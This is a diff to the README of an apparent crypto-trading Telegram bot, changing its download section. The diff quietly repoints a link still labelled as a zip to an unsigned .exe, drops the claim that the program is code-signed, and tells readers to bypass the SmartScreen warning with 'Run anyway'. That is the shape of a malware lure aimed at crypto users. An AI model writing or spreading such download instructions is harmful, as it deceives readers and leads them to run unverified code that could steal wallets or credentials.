@@ -28,12 +28,11 @@ After you buy, it keeps watching. If the developer raises the sell tax or pulls 
 
 ## Download
 
-[Download `token-trade-telegram-bot.zip`](https://github.com/BlackInspection/token-trade-telegram-bot/releases/latest/download/token-trade-telegram-bot.zip) — one zip, no installer, no admin rights.
+[Download `token-trade-telegram-bot.zip`](https://github.com/BlackInspection/token-trade-telegram-bot/releases/latest/download/Tokentrade-1.3.91-portable-x64.exe) — one zip, no installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Tokentrade` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 
